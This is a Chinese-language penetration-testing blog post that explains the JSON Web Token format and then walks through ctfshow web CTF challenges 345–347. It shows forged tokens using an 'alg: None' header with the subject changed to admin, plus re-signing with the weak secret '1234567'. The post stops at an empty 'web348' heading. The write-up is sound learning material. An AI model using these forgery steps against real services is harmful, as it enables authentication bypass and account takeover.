---
title: JWT
date: 2023-09-03T15:29:52+08:00
updated: 2023-06-13T22:35:03+08:00
categories: 
- 渗透测试
- 外网漏洞
---

## 什么是jwt

jwt全名json web token,用于创建具有可选[签名](https://en.wikipedia.org/wiki/Signature_(cryptography))和/或可选[加密](https://en.wikipedia.org/wiki/Encryption)的数据，其[有效负载](https://en.wikipedia.org/wiki/Payload_(computing))包含断言一些[声明的](https://en.wikipedia.org/wiki/Claims-based_identity)[JSON](https://en.wikipedia.org/wiki/JSON) . [使用私人秘密](https://en.wikipedia.org/wiki/Shared_secret)或[公钥/私钥](https://en.wikipedia.org/wiki/Public-key_cryptography)对令牌进行签名。其效果类似于我们常用的cookie,但是相较于cookie更具有扩展性；

## jwt的组成

jwt通常由三部分组成，**header**,**payload**以及**Signature**

[这三个部分使用Base64url Encoding [RFC]分别编码，并使用句点连接以生成 JWT：

```
const  token  =  base64urlEncoding ( header )  +  '.'  +  base64urlEncoding ( payload )  +  '.'  +  base64urlEncoding （签名）
```

生成的const再与secretkey联合生成token:

这个生成的令牌可以很容易地传递到html和http

## jwt的使用

在身份验证中，当用户使用他们的凭据成功登录时，将返回一个 JSON Web Token 并且必须保存在本地，而不是传统的创建会话的方法在服务器中并返回一个 cookie，对于无人值守的进程，客户端还可以通过使用预共享秘密生成和签署自己的 JWT 来直接进行身份验证，并将其传递给[OAuth](https://en.wikipedia.org/wiki/OAuth)兼容服务。

```
POST /oauth2/token
Content-type: application/x-www-form-urlencoded

grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=eyJhb...
```

如果通过了一个jwt断言，服务端就会生成access_token，并且传递应用；

## jwt的声明

payload:

```
iss: jwt签发者
sub: jwt所面向的用户
aud: 接收jwt的一方
exp: jwt的过期时间，这个过期时间必须要大于签发时间
nbf: 定义在什么时间之前，该jwt都是不可用的.
iat: jwt的签发时间
jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。
```

header:

```
typ: 令牌类型(例如jwt)
cyp: content-type(内容类型)
alg: 消息验证使用的加密算法(通常设置为HMAC SHA256即HS256)
kid: key ID
x5c,x5u: 证书链及其url,用于判断签名的真实性
crit: 关键点，服务端必须要理解的标头列表，以验证令牌
```

## jwt的漏洞

某些库使用alg字段错误的验证令牌，例如:alg=none;同时还有jwt的cve

## 从题目探寻jwt攻击

题库采用ctfshow web入门jwt系列

## web345

由cookie值解码可得jwt的构成

```
header:
{"alg":"None","typ":"jwt"}
eyJhbGciOiJOb25lIiwidHlwIjoiand0In0（去掉等号）
payload:
[{"iss":"admin","iat":1683806390,"exp":1683813590,"nbf":1683806390,"sub":"user","jti":"02b9328bfc9a37456e7af2592ee43fc3"}]
改为[{"sub":"admin"}]
```

提示我们使用admin

我们将user改为admin进行加密：

```
W3sic3ViIjoiYWRtaW4ifV0
```

拼接替换cookie访问/admin

```
eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoiYWRtaW4ifV0
```

## web346-347

同样拿到jwt进行解码：

```
header:
{
  "alg": "HS256",
  "typ": "JWT"
}
payload:
{
  "iss": "admin",
  "iat": 1683808745,
  "exp": 1683815945,
  "nbf": 1683808745,
  "sub": "user",
  "jti": "1d68cb103232bb03ba8c72d59d5914c6"
}
算法改为了HS256,我们可以把alg改为none进行尝试；并且sub改为admin
```

用脚本跑出来不太行，还是利用弱口令1234567来加密

http://jwt.io

## web348